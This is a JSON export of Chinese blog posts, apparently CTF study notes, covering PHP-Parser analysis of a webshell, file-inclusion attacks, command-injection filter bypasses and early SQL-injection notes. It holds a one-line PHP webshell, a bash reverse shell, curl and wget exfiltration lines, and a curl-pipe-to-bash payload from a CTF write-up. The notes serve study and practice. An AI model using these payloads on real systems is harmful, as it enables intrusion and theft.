[{"title":"notes for php-parser","url":"/2022/01/20/notes-for-php-parser/","content":"\n# notes for php-parser \n\n## Background \n\n最近根据需求，学习php代码的静态分析，希望能提取php代码的AST，采用php-parser库\n\nhttps://github.com/nikic/PHP-Parser\n\n所以这篇其实应该叫做`结合php-parser学习污点分析`\n\n且该篇基本不对ast转换为原本代码做过多的研究\n\n## basic operation\n\n根据文档，编写小demo记录所需的用法\n\n```php\n<?php\n\t// 加载\n\trequire_once(\"vendor/autoload.php\");\n\n\t// 使用命名空间\n\tuse PhpParser\\ParserFactory;\n\tuse PhpParser\\NodeDumper;\n\t\t\n\t// 要解析的代码\n\t$code = file_get_contents('test/1.php');\n\t// <?php @assert($_POST['shell']);?>\n\n\t// 实例化 将代码解析为php7\n\t$parser = (new ParserFactory)->create(ParserFactory :: PREFER_PHP7);\n\n\ttry{\n\t\t$ast = $parser->parse($code);\n\t\t// dump输出\n\t\t$nodeDump= new NodeDumper();\n\t\techo $nodeDump->dump($ast);\n\t}catch(Error $e){\n\t\techo 'Parse Error: ', $e->getMessage();\n\t}\n?>\n```\n\n得结果：\n\n```\narray(\n    0: Stmt_Expression(\n        expr: Expr_ErrorSuppress(\n            expr: Expr_FuncCall(\n                name: Name(\n                    parts: array(\n                        0: assert\n                    )\n                )\n                args: array(\n                    0: Arg(\n                        name: null\n                        value: Expr_ArrayDimFetch(\n                            var: Expr_Variable(\n                                name: _POST\n                            )\n                            dim: Scalar_String(\n                                value: shell\n                            )\n                        )\n                        byRef: false\n                        unpack: false\n                    )\n                )\n            )\n        )\n    )\n)\n```\n\n这里包含了`Stmt_Expression`节点，对应的空间为`PhpParser\\Node\\Stmt\\Function_`\n\n这里做了三种类别：\n\n- `PhpParser\\Node\\Stmt` 语句节点，不返回值，且不能出现在一个表达式中，例如类定义`class A`\n- `PhpParser\\Node\\Expr`表达式节点，有返回值的语言结构，如变量`$a`、函数`func()`\n- `PhpParser\\Node\\Scalar`标量节点，如`string` `__FILE__`\n- 其他节点如`PhpParser\\Node\\Name`、`PhpParser\\Node\\Arg`\n\n所以上述一句话木马中的结构含有一个函数调用，所以仅有一个`Stmt_Expression`节点\n\n所以也可以针对这棵语法树对节点部分做分析\n\n加一个循环来输出看内部结构\n\n```php\nforeach($ast as $item){\n\t\t\tvar_dump($item,'\\n');\n\t\t}\n```\n\n可以看到更具体的类型和格式\n\n```\nobject(PhpParser\\Node\\Stmt\\Expression)#1185 (2) {\n  [\"expr\"]=>\n  object(PhpParser\\Node\\Expr\\ErrorSuppress)#1184 (2) {\n    [\"expr\"]=>\n    object(PhpParser\\Node\\Expr\\FuncCall)#1183 (3) {\n      [\"name\"]=>\n      object(PhpParser\\Node\\Name)#1178 (2) {\n        [\"parts\"]=>\n        array(1) {\n          [0]=>\n          string(6) \"assert\"\n        }\n        [\"attributes\":protected]=>\n        array(2) {\n          [\"startLine\"]=>\n          int(1)\n          [\"endLine\"]=>\n          int(1)\n        }\n      }\n      [\"args\"]=>\n      array(1) {\n        [0]=>\n        object(PhpParser\\Node\\Arg)#1182 (5) {\n          [\"name\"]=>\n          NULL\n          [\"value\"]=>\n          object(PhpParser\\Node\\Expr\\ArrayDimFetch)#1181 (3) {\n            [\"var\"]=>\n            object(PhpParser\\Node\\Expr\\Variable)#1179 (2) {\n              [\"name\"]=>\n              string(5) \"_POST\"\n              [\"attributes\":protected]=>\n              array(2) {\n                [\"startLine\"]=>\n                int(1)\n                [\"endLine\"]=>\n                int(1)\n              }\n            }\n            [\"dim\"]=>\n            object(PhpParser\\Node\\Scalar\\String_)#1180 (2) {\n              [\"value\"]=>\n              string(5) \"shell\"\n              [\"attributes\":protected]=>\n              array(3) {\n                [\"startLine\"]=>\n                int(1)\n                [\"endLine\"]=>\n                int(1)\n                [\"kind\"]=>\n                int(1)\n              }\n            }\n            [\"attributes\":protected]=>\n            array(2) {\n              [\"startLine\"]=>\n              int(1)\n              [\"endLine\"]=>\n              int(1)\n            }\n          }\n          [\"byRef\"]=>\n          bool(false)\n          [\"unpack\"]=>\n          bool(false)\n          [\"attributes\":protected]=>\n          array(2) {\n            [\"startLine\"]=>\n            int(1)\n            [\"endLine\"]=>\n            int(1)\n          }\n        }\n      }\n      [\"attributes\":protected]=>\n      array(2) {\n        [\"startLine\"]=>\n        int(1)\n        [\"endLine\"]=>\n        int(1)\n      }\n    }\n    [\"attributes\":protected]=>\n    array(2) {\n      [\"startLine\"]=>\n      int(1)\n      [\"endLine\"]=>\n      int(1)\n    }\n  }\n  [\"attributes\":protected]=>\n  array(2) {\n    [\"startLine\"]=>\n    int(1)\n    [\"endLine\"]=>\n    int(1)\n  }\n}\n```\n\n`getType()`可以返回节点类型，结合访问某个节点，这里想拿到一句话木马里调用的函数名，可以这么写\n\n```php\nprint_r(getType($ast[0]->expr->expr->name->parts[0])); // string 这里返回的类型不带前缀和下划线\nprint_r($ast[0]->expr->expr->name->parts[0]);// assert\n```\n\n\n\n## Node traversation\n\n`use PhpParser\\NodeTraverser`\n\n基本用法\n\n```php\n\n```\n\n\n\n```php\n(\n    [0] => PhpParser\\Node\\Stmt\\Expression Object\n        (\n            [expr] => PhpParser\\Node\\Expr\\ErrorSuppress Object\n                (\n                    [expr] => PhpParser\\Node\\Expr\\FuncCall Object\n                        (\n                            [name] => PhpParser\\Node\\Name Object\n                                (\n                                    [parts] => Array\n                                        (\n                                            [0] => assert\n                                        )\n\n                                    [attributes:protected] => Array\n                                        (\n                                            [startLine] => 1\n                                            [endLine] => 1\n                                        )\n\n                                )\n\n                            [args] => Array\n                                (\n                                    [0] => PhpParser\\Node\\Arg Object\n                                        (\n                                            [name] =>\n                                            [value] => PhpParser\\Node\\Expr\\ArrayDimFetch Object\n                                                (\n                                                    [var] => PhpParser\\Node\\Expr\\Variable Object\n                                                        (\n                                                            [name] => _POST\n                                                            [attributes:protected] => Array\n                                                                (\n                                                                    [startLine] => 1\n                                                                    [endLine] => 1\n                                                                )\n\n                                                        )\n\n                                                    [dim] => PhpParser\\Node\\Scalar\\String_ Object\n                                                        (\n                                                            [value] => shell\n                                                            [attributes:protected] => Array\n                                                                (\n                                                                    [startLine] => 1\n                                                                    [endLine] => 1\n                                                                    [kind] => 1\n                                                                )\n\n                                                        )\n\n                                                    [attributes:protected] => Array\n                                                        (\n                                                            [startLine] => 1\n                                                            [endLine] => 1\n                                                        )\n\n                                                )\n\n                                            [byRef] =>\n                                            [unpack] =>\n                                            [attributes:protected] => Array\n                                                (\n                                                    [startLine] => 1\n                                                    [endLine] => 1\n                                                )\n\n                                        )\n\n                                )\n\n                            [attributes:protected] => Array\n                                (\n                                    [startLine] => 1\n                                    [endLine] => 1\n                                )\n\n                        )\n\n                    [attributes:protected] => Array\n                        (\n                            [startLine] => 1\n                            [endLine] => 1\n                        )\n\n                )\n\n            [attributes:protected] => Array\n                (\n                    [startLine] => 1\n                    [endLine] => 1\n                )\n\n        )\n\n)\n```\n\n\n\n需要实现`PhpParser\\NodeVisitor`接口\n\n```php\npublic function beforeTraverse(array $nodes); // 遍历之前调用，可以用于遍历之前重置或准备\npublic function enterNode(\\PhpParser\\Node $node); // 进入遍历时调用\npublic function\tleaveNode(\\PhpParser\\Node $node); // 离开此次遍历时调用\npublic function afterTraverse(array $nodes); // 在遍历之后被调用一次\n```\n\n\n\n\n\n","tags":["web"]},{"title":"php文件包含漏洞","url":"/2022/01/20/php文件包含漏洞/","content":"\n# php文件包含漏洞\n\n## 描述\n\n> 开发人员为了使得代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞\n\n### 相关函数\n\n```\ninclude()\ninclude_once()\nrequire()\nrequire_once()\n```\n\ninclude 和 require的区别在于，如果包含的文件有错误，include会继续往下执行，如果是require就不会\n\n## 本地包含漏洞(LFI)\n\n一个phpinfo.txt走天下\n\n```PHP\n<?php\n    phpinfo();\n?>\n```\n\n```PHP\n<?php\n    include(\"phpinfo.txt\");\n?>\n```\n\n只要文件内容复合php语法规范，那么任何扩展名都可以被php解析\n包含非php语法规范原文件时，将会暴露其源代码\n\n典型的漏洞代码\n\n```PHP\n<?php\n    $filename = $_GET['filename']; \n    include($filename); \n?>\n```\n\nfilename没有进行过滤，可以被用户控制\n这里可以结合目录遍历漏洞查看敏感信息\n\n## 远程文件包含(RFI)\n\n注：要确定php是否已经开启远程包含功能(默认是关闭)\n\n```.properties\nalow_url_include = On\n```\n\n栗子：\n\nwww.text.com根目录存在phpinfo.txt\n\n```PHP\n<?php\n    include($_GET['a'])\n?>\n```\n\n[www.text.com?a=http://www.text.com/phpinfo.txt](http://www.text.com?a=http://www.text.com/phpinfo.txt)\n\n若文件不存在，也可以通过观察暴露出的警告\n\n## 敏感文件利用\n\n利用重点：找到可控的文件\n\n对于可执行的文件(包含可执行php代码的文件，不一定是php后缀)：可以直接利用文件包含执行\n对于不可执行的文件：可以利用文件包含查看其内容\n\nWindows系统：\n\n| 文件                                      | 内容                          |\n| ----------------------------------------- | ----------------------------- |\n| C:\\boot.ini                               | 系统版本                      |\n| C:\\windows\\system32\\intetsrv\\MetaBase.xml | IIS配置文件                   |\n| C:\\windows\\repair\\sam                     | 存储Windows系统初次安装的密码 |\n| C:\\Program Files\\mysql\\my.ini             | Mysql配置                     |\n| C:\\windows\\mysql\\data\\mysql\\user.MYD      | Mysql root                    |\n| C:\\window\\php.inis                        | php配置信息                   |\n| C:\\windows\\my.ini                         | Mysql配置文件                 |\n\nUnix/Linux系统：\n\n| 文件                                               | 内容               |\n| -------------------------------------------------- | ------------------ |\n| /etc/passwd                                        |                    |\n| /usr/local/app/apache/conf/httpd.conf              | apache默认配置文件 |\n| /usr/local/app/apache/conf/extra/httpd-vhosts.conf | 虚拟网站设置       |\n| /usr/local/app/php5/lib/php.ini                    | php相关设置        |\n| /etc/httpd/conf/httpd.conf                         | apache配置文件     |\n| /etc/my.cnf                                        | mysql的配置文件    |\n\n\n## 远程包含shell\n\n若目标主机`allow_url_fopen`的选项是激活的，然后包含一句话木马\n\n> （1） allow_url_fopen=on\n> 本选项激活了URL形式的fopen封装协议使得可以访问URL对象例如文件，默认的封装协议提供ftp和http协议来访问远程文件，一些扩展库例如zlib可能会注册更多的封装协议\n> （2） allow_url_include=on\n> This option allows the use of URL-aware fopen wrappers with the following functions： include...\n\n?filename=你的远程文件路径\n远程文件中的php代码会被解析\n若后缀名写死了，可以用?绕过\n\n## 伪协议\n\n- [file://](https://www.php.net/manual/zh/wrappers.file.php) — 访问本地文件系统\n- [http://](https://www.php.net/manual/zh/wrappers.http.php) — 访问 HTTP(s) 网址\n- [ftp://](https://www.php.net/manual/zh/wrappers.ftp.php) — 访问 FTP(s) URLs\n- [php://](https://www.php.net/manual/zh/wrappers.php.php) — 访问各个输入/输出流（I/O streams）\n- [zlib://](https://www.php.net/manual/zh/wrappers.compression.php) — 压缩流\n- [data://](https://www.php.net/manual/zh/wrappers.data.php) — 数据（RFC 2397）\n- [glob://](https://www.php.net/manual/zh/wrappers.glob.php) — 查找匹配的文件路径模式\n- [phar://](https://www.php.net/manual/zh/wrappers.phar.php) — PHP 归档\n- [ssh2://](https://www.php.net/manual/zh/wrappers.ssh2.php) — Secure Shell 2\n- [rar://](https://www.php.net/manual/zh/wrappers.rar.php) — RAR\n- [ogg://](https://www.php.net/manual/zh/wrappers.audio.php) — 音频流\n- [expect://](https://www.php.net/manual/zh/wrappers.expect.php) — 处理交互式的流\n\n### php://input\n\n代表可以访问请求的原始数据，可以获取到post的数据并将其作为php代码执行\n\n条件：\n\n```PHP\nallow_url_fopen: off/on\n\nallow_url_include: on\nindex.php?file=php://input\nPOST:\n<? phpinfo(); ?>\n```\n\n利用\n\n遇到file_get_contents()可以利用该协议\n\n```.properties\nfile_get_contents(\"php://input\");\nPOST:xxx\n```\n\n**写木马**\n\n条件：php中开启allow_url_fopen 和 allow_url_include（PHP < 5.3.0）\n\nPOST: 木马\n\n\n\n**命令执行**\n\nPOST:\n\n```php\n<?php system('ls -a');?>\n```\n\n### php://output\n\n只写的数据流\n\n### file:\n\nfile://[绝对路径及文件名]\n\n访问本地文件\n\n### php://filter\n\n一种元封装器，设计用于数据流打开时的筛选过滤应用，也就是过滤器\n\n参数：\n\n```PHP\nresource=<要过滤的数据流> 这个参数是必须的。它指定了你要筛选过滤的数据流。\n\nread=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。\n\nwrite=<写链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。\n\n<；两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。\n```\n\n常用的payload：\n\n```\nphp://filter/read=convert.base64-encode/resource=xxx.php\nphp://filter/convert.base64-encode/resource=/flag\nphp://filter/write=convert.base64-decode/resource=xxx.php \n```\n\n这里就是使用convert.base64-encode这个过滤器，对xxx.php的内容进行base64编码后再读取\n\n还有其他一些奇妙的编码\n\n```PHP\nstream_filter_append stream_filter_prepend\n给流添加过滤器 \n```\n\nhttps://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list\n\nhttps://www.smi1e.top/文件包含漏洞与php伪协议/\n\nhttps://www.php.net/manual/zh/filters.php\n\n### data:\n\ndata:资源类型;编码,内容\n\n```PHP\ndata://text/plain,xxxxx\ndata:text/plain,xxxxx\ndata://text/plain;base64,xxxxx\ndata:text/plain;base64,xxxxx \n```\n\n### 压缩包伪协议\n\npchar://\n\nzip://\n\n```.properties\n?url=zip://xxxxxx#phpinfo.php\n```\n\n\n\n## 绕过限制\n\n### 截断\n\n```PHP\n<?php\n    $filename  = $_GET['filename'];\n    include($filename,\".html\");\n?>\n```\n\n%00截断->导致扩展名被截断\n\n> (1) magic_quotes_gpc=off(2) PHP<5.3.4\n> 构造超过最大长度限制payload-系统会将后面的路径丢弃，扩展名被截断\n> Windows下目录的最大路径256BLinux下目录的最大路径长度为4096B\n\n注意这里要# 有编码问题时替换成#\n\n### 编码绕过\n\nurl多次编码\nunicode形近字型绕过\n\n\n\n\n\n## 利用日志文件\n\n用户发起请求时会将请求写入 **access.log**\n\n发生错误时将错误写入 **error.log**\n\n一些常见的日志路径：\n\n/var/log/nginx/access.log\n/var/log/apache2/access.log\n\n\n## 包含session\n\nphp的session文件保存路径可以在**phpinfo**中的session.save_path看到，若为空，说明在默认存放位置\n\n命名格式：sess_[PHPSESSID]\n\n```.properties\n1./var/lib/php/sess_PHPSESSID\n(php5 or php 7 or php)\n2./tmp/sess_PHPSESSID\n3./tmp/sessions/sess_PHPSESSID\n```\n\n查看PHPSESSID\n\nF12-Application-Cookies\n\n一个小参考，先记录一些未来可能出现的考点\n\n```\nsession.save_path=\"\"  --设置session的存储路径session.save_handler=\"\" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，默认files以文件存储session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动session.serialize_handler  string --定义用来序列化/\n```\n\n\n\n[https://zhuanlan.zhihu.com/p/90879209](https://zhuanlan.zhihu.com/p/90879209)\n\n### 利用session文件包含漏洞RCE\n\n> session.upload_progress.enabled \n>\n> 若不在php.ini中将其置为Off，就会在上传过程中生成上传进度文件，并且可以从phpinfo中获取\n\n当session中的内容可以控制（如传参内容没被过滤，传入的值存储到session中），就可以利用传参的过程获取敏感信息或RCE","tags":["web"]},{"title":"命令执行","url":"/2022/01/20/命令执行/","content":"\n# 命令执行\n\n目前了解的知识还有限，先简单总结一些有遇到过的\n以后遇到新题目会补充\n\n## PHP命令执行\n\n相关常见函数：\n**${php代码}**\n**assert()**\n普通调用\n\n```php\n<?php assert($_POST['a']);?>\n```\n\n动态调用\n\n```php\n<?php\n    $a = 'assert';\n    $a($_POST['a']);\n?>\n```\n\n注：php7.0.29后有改动\n\n```php\n<?php\n    $a = 'assert';\n    $a(phpinfo());\n?>\n```\n\n**system()**\n\n```php\nsystem(\"ls -a\");\n```\n\n**shell_exec()**\n\n```php\necho shell_exec(\"ls -a\");\n```\n\n**exec()**\n\n```php\necho exec(\"ls -a\");\n```\n\n**eval()**: 将字符串按照php代码来执行 \nshell_exec()：执行shell命令并返回输出的字符串\n\n```php\neval(\"echo phpinfo();\")\n```\n\npassthru 执行给定的命令，但是不返回任何输出结果，直接输出到显示设备上\n\n```php\nvoid passthru (string command [, int return_var])\n```\n\n## 含有该漏洞的一些框架\n\n较低版本的Struts2、ThinkPHP\n\n\n## 常用绕过手段\n\n分隔符\n\n```\nlinux: %0a %0d ; & | && ||\nwindows: %0a & | %la\n```\n\n```\n; ->从左到右连续执行命令\n& ->简单拼接\n&& -> \"逻辑与\"，前面执行成功后面才会执行\n| ->\n|| ->\"逻辑或\" 前面失败，后面执行\n```\n\n### 绕过空格\n\n${IFS}、${IFS}$9|、$IFS$9、%0a、<>\n\nfuzz：`%00~%ff`\n\n### 绕过敏感字符\n\n拼接绕过\n\n```\na=l;b=s;$a$b\n```\n\ntrick：有时可以调整顺序绕过正则\n\n借用已有字符 substr\n\n```\n\n```\n\n`$()`执行代码\n\n```\n?shell=$a=\"xxx\";$a(\"whoami\");\n```\n\n\n\n### base64编码绕过\n\n```\n[root@ ~]# echo 'cat' | base64\nY2F0Cg==\n[root@ ~]# echo 'hello' > test.txt\n[root@ ~]# cat test.txt \nhello\n[root@ ~]# `echo 'Y2F0Cg=='| base64 -d` test.txt\nhello\n```\n\n### 绕过长度限制\n\n#### 七字符长度限制\n\n例如要读取flag.php\n\n```\n>\"hp\\\\\"\n>\".p\\\\\"\n>\"ag\\\\\"\n>\"fl\\\\\"\n>\"t+\\\\\"\n>\"ca\\\\\"\n\nls -t>_\nsh _\n```\n\n```\n> 重定向符\n```\n\n新建一个 xx\\ 文件\nls -t按时间顺序将输出到名字叫_的文件中\nsh 执行文件内容\n\n\n#### 五字符长度限制\n\n```php\n<?php\n    $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {\n        @exec($_GET['cmd']);\n    } else if (isset($_GET['reset'])) {\n        @exec('/bin/rm -rf ' . $sandbox);\n    }\n    highlight_file(__FILE__);\n?>\n```\n\n像上面的命令中 `ls -t>_`是最长的长度，这里需要突破的就是构造这条\n\n\n#### 四字符长度限制\n\n```\n[root@izbp15j82tplbsbdrdv1kgz cmd]# ls\necho  hello\n[root@izbp15j82tplbsbdrdv1kgz cmd]# *\nhello\n```\n\n这里`*`等同于`echo hello`，相当于把列出的第一个文件名当命令，第二个文件名当参数\n\n要凑的命令是`ls -th>g`\n\n这里要利用`rev`进行反转，所以在反转之前我们希望ls可以看到`g>ht- sl`，但是这里正常的字母顺序是g s t，因为希望t在前所以增加个参数h\n\n```shell\n>dir\n>sl\n>g\\>\n>ht-\n\n[root@izbp15j82tplbsbdrdv1kgz four]# ls\ndir  g>  ht-  sl\n[root@izbp15j82tplbsbdrdv1kgz four]# *\t//此时相当于$(dir *)\ng>  ht-  sl\n[root@izbp15j82tplbsbdrdv1kgz four]# *>v\t//把 g> ht- sl写入文件v\n[root@izbp15j82tplbsbdrdv1kgz four]# >rev\t//写一个文件rev \n[root@izbp15j82tplbsbdrdv1kgz four]# ls\t//看看当前有啥\ndir  g>  ht-  rev  sl  v\n\n[root@izbp15j82tplbsbdrdv1kgz four]# *v>x //这里利用了通配符*去匹配到了rev，这里就相当于 rev v>x\n\n[root@izbp15j82tplbsbdrdv1kgz four]# cat x\nls  -th  >g\n[root@izbp15j82tplbsbdrdv1kgz four]# sh x\n\n[root@izbp15j82tplbsbdrdv1kgz four]# cat g \ng\nx\nrev\nv\nht-\ng>\nsl\ndir\n\n```\n\n可以利用这个方式来写马和反弹shell\n\n## 无回显命令注入\n\n### 反弹shell\n\n最基本的利用场景\n(攻击机)vps上监听2333端口\n\n```\nnc -lvvp 2333\n```\n\n(靶机)kali上输入：\n\n```\nbash -i >& /dev/tcp/ip/port 0>&1\n```\n\nip为vps的公网ip，port为开放的端口\n攻击机getshell，获得靶机的控制权，靶机无法退出\n\n### HTTP外带\n\n```\ncurl example.com/`whoami`\nwget example.com/$(id|base64)\n```\n\n\n\n### dnslog外带\n\n[ceye平台](ceye.io)\n在profile页可以看到属于自己的域名\n\n根据平台上提供的payload，做简单实验\n![ceye.png](https://www.noname0519.com/upload/2020/5/ceye-5b8b4078335c4aa58407239559352838.png)\ncurl发起http请求\n`whoami`被执行\n![ceye2.png](https://www.noname0519.com/upload/2020/5/ceye2-fdc771b9d4f4433394718d149cf08dd6.png)\nDNS Query可以带着执行结果回显\n\n\n\n### 写入文件后再访问\n\n```\n?shell=\"ls > z\"\n```\n\n\n\n## 命令盲注\n\n主要是DASCTF五月赛web1感受到的考点，不通外网的无回显命令注入（一开始直接扫到flag真的震惊\n\n一开始出现很多非预期，例如直接把flag重定向到某个文件中直接读\n\n```\necho `cat /flag` > 1\ncat 1\n```\n\n示例\n![bash1.png](https://www.noname0519.com/upload/2020/5/bash1-03d6c379f0b34187b5ede9be4ac98c85.png)\n\n预期解是命令盲注\n(对Linux命令太陌生了，我晕)\n\n```\ngrep -e \"B\" && sleep 5\n```\n\n### 布尔盲注\n\n```\n[root@ ~]# l$(whoami | cut -c 1 | tr a s)\n-bash: lr: command not found\n[root@ ~]# l$(whoami | cut -c 1 | tr r s)\n命令成功执行\n\n[root@ ~]# l$(whoami | cut -c 2 | tr r s)\n-bash: lo: command not found\n[root@ ~]# l$(whoami | cut -c 2 | tr o s)\n命令成功执行\n```\n\ncut -c 1  提取结果的第一个字符\n\ntr将a、r替换成s\n\n### 时间盲注\n\n```\nsleep $(whoami | cut -c 1 | tr a 1)\n\nsleep $(whoami | cut -c 1 | tr r 1)\n```\n\n和上面类似，若为r则延时1s\n\n记一个不使用vps进行注入的博文(我也想做梦了)\n[https://www.cnblogs.com/blili/p/9045280.html](https://www.cnblogs.com/blili/p/9045280.html)\n\n## 一些绕过WAF防火墙的tips\n\n通配符绕过\n\n```\n/bin/ls\n\n/???/?s\n```\n\n利用\"空值\"\n在Linux的bash下有一些符号会被认为是空，可以用来绕过一些限制\n\n```\n\\ 、 ''、$1~$n\n```\n\n```\nl\\s\nl''s\nl$1s\n```\n\n花括号扩展\n\n```\n[root@ ~]# echo a{b,c}\nab ac\n[root@ ~]# {ls,./}\n执行ls结果\n```\n\n## CTF-Hub RCE\n\n### 命令注入-无过滤\n\n```php\nif (isset($_GET['ip']) && $_GET['ip']) {\n    $cmd = \"ping -c 4 {$_GET['ip']}\";\n    exec($cmd, $res);\n}\n```\n\n```\n127.0.0.1|ls -a\n```\n\n```\nArray\n(\n    [0] => .\n    [1] => ..\n    [2] => 581882612214.php\n    [3] => index.php\n)\n```\n\n```\n127.0.0.1|cat 581882612214.php\n```\n\nF12就能看到\n\n### 过滤cat\n\n```php\nif (isset($_GET['ip']) && $_GET['ip']) {\n    $ip = $_GET['ip'];\n    $m = [];\n    if (!preg_match_all(\"/cat/\", $ip, $m)) {\n        $cmd = \"ping -c 4 {$ip}\";\n        exec($cmd, $res);\n    } else {\n        $res = $m;\n    }\n}\n```\n\n127.0.0.1|ls\n看到flagblabla.php\n\n绕过cat的方法\n**单双引号+反斜杠**\n\n```\n127.0.0.1|c'a't flag_314923142532007.php\n127.0.0.1|c\"a\"t flag_314923142532007.php\n127.0.0.1|c\\a\\t flag_314923142532007.php\n```\n\n### 过滤空格\n\n```php\n<?php\n$res = FALSE;\nif (isset($_GET['ip']) && $_GET['ip']) {\n    $ip = $_GET['ip'];\n    $m = [];\n    if (!preg_match_all(\"/ /\", $ip, $m)) {\n        $cmd = \"ping -c 4 {$ip}\";\n        exec($cmd, $res);\n    } else {\n        $res = $m;\n    }\n}?>\n```\n\npayload:\n\n```\n127.0.0.1|ls\n127.0.0.1|cat$IFS$9flag_252091676416142.php\nor\n127.0.0.1|cat${IFS}flag_252091676416142.php\nor\n127.0.0.1|cat${IFS}$9flag_252091676416142.php\n```\n\n### 过滤目录分隔符\n\n题目：\n\n>这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗\n\n```php\n<?php\n$res = FALSE;\nif (isset($_GET['ip']) && $_GET['ip']) {\n    $ip = $_GET['ip'];\n    $m = [];\n    if (!preg_match_all(\"/\\//\", $ip, $m)) {\n        $cmd = \"ping -c 4 {$ip}\";\n        exec($cmd, $res);\n    } else {\n        $res = $m;\n    }\n}?>\n```\n\npayload\n\n```\n127.0.0.1|ls\n```\n\n这次flag是在一个目录之下\n\n```\nArray\n(\n    [0] => flag_is_here\n    [1] => index.php\n)\n```\n\n```\n127.0.0.1|ls $IFS$9flag_is_here\nor\n127.0.0.1;cd flag_is_here;ls\n\n127.0.0.1;cd flag_is_here;cat flag_15476372413684.php\n```\n\n### 过滤运算符\n\n```php\n<?php\n$res = FALSE;\nif (isset($_GET['ip']) && $_GET['ip']) {\n    $ip = $_GET['ip'];\n    $m = [];\n    if (!preg_match_all(\"/(\\||\\&)/\", $ip, $m)) {\n        $cmd = \"ping -c 4 {$ip}\";\n        exec($cmd, $res);\n    } else {\n        $res = $m;\n    }\n}?>\n```\n\n```\n127.0.0.1;ls\n127.0.0.1;cat flag....php\n```\n\n。。。就这么过了？\n\n### 综合过滤练习\n\n```php\n<?php\n$res = FALSE;\nif (isset($_GET['ip']) && $_GET['ip']) {\n    $ip = $_GET['ip'];\n    $m = [];\n    if (!preg_match_all(\"/(\\||&|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) {\n        $cmd = \"ping -c 4 {$ip}\";\n        exec($cmd, $res);\n    } else {\n        $res = $m;\n    }\n}?>\n```\n\n哦豁\npayload\n注意：这里使用%0a分割的时候要在url里，否则会被再次编码\n\n```\n?ip=127.0.0.1%0als\n?ip=127.0.0.1%0acd${IFS}$f***_is_here%0amore${IFS}$f***\nor\n?ip=127.0.0.1%0acd${IFS}$f***_is_here%0a'ca't${IFS}$fl'a'g\n```\n\n还有base64转编码的方式没使用，下次一定\n\n### GXY-CTF PingPingPing\n\n### BJD-CTF duangshell\n\nurl/.index.php.swp\n\n```php\n<?php\nerror_reporting(0);\necho \"how can i give you source code? .swp?!\".\"<br>\";\nif (!isset($_POST['girl_friend'])) {\n    die(\"where is P3rh4ps's girl friend ???\");\n} else {\n    $girl = $_POST['girl_friend'];\n    if (preg_match('/\\>|\\\\\\/', $girl)) {\n        die('just girl');\n    } else if (preg_match('/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i', $girl)) {\n        echo \"<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->\";\n    } else {\n        //duangShell~~~~\n        exec($girl);\n    }\n}\n```\n\n好像都被禁得差不多了。。\n应该是反弹shell\n\n一开始很费解为什么弹不出来，后来发现没注意靶机无法连接外网。。所以开个小号启动个内部靶机\n\n```\nifconfig\n```\n\n看ip\n\n在靶机中写一个shell.txt\n\n**注：这题是要写在/var/www/html中**\n\n```\nbash -i >& /dev/tcp/ip/2333 0>&1\n```\n\n在vps上\n\n```\nnc -lvvp 2333\n```\n\nPOST:\n\n```\ngirl_friend=curl 174.1.12.79/shell.txt|bash\n```\n\n\n参考：\nhttp://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/\n\n\nhttps://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/\n\nhttps://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87\n\nhttps://www.tr0y.wang/2019/05/13/OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97\n\nhttp://www.secist.com/archives/3854.html\n\nhttps://xz.aliyun.com/t/2548\n\nhttps://xz.aliyun.com/t/8125#toc-2","tags":["web"]},{"title":"SSTI模板注入","url":"/2022/01/20/SSTI模板注入/","content":"\n# SSTI模板注入\n\n其实之前整理过了，但是题目难度今时不同往日了（x\n\n主要以另外的方式记录一些新学习的payload、绕过限制的方式\n\n## python中的模板注入\n\n### 魔术方法\n\n```\n__dict__ 保存类实例或对象实例的属性变量键值对字典\n__class__ 返回类型所属的对象 \n__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。\n__base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 \n__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 \n__init__ 类的初始化方法 \n__globals__ 对包含函数全局变量的字典的引用\n```\n\n### 基本流程\n\n\n\n### 语法\n\n```\n{% %}\n{{}} 打印到模板输出\n{# #} 未包含在模板输出中的注释\n\n```\n\n\n\n### 绕过思路\n\n\n\n## php中的模板注入\n\n\n\n## java中的模板注入\n\n\n\n"},{"title":"SQL注入-基本查询及注入备忘","url":"/2022/01/20/SQL注入-基本查询及注入备忘/","content":"\n# SQL注入-基本查询及注入语句\n\n## MYSQL数据库结构\n\n数据库--表--列--字段\n\n## MySQL常用函数\n\n读文件\n\n```sql\nselect load_file('path');\n```\n\n写文件\n\n```sql\nselect 'filename' into outfile 'path';\n```\n\n**ASCII()/ORD()** 返回字符串的ascii码值\n\n```sql\nselect ord(); -- 返回第一个ascii码值\n```\n\n**MID()/SUBSTR()** 返回一个字符串的一部分\n\n```sql\nselect mid('mysql',1,2); -- my\nselect mid('mysql', 2,2); --- ys\nselect substr('mysql',1,2); -- my\n```\n\n**LEFT()** 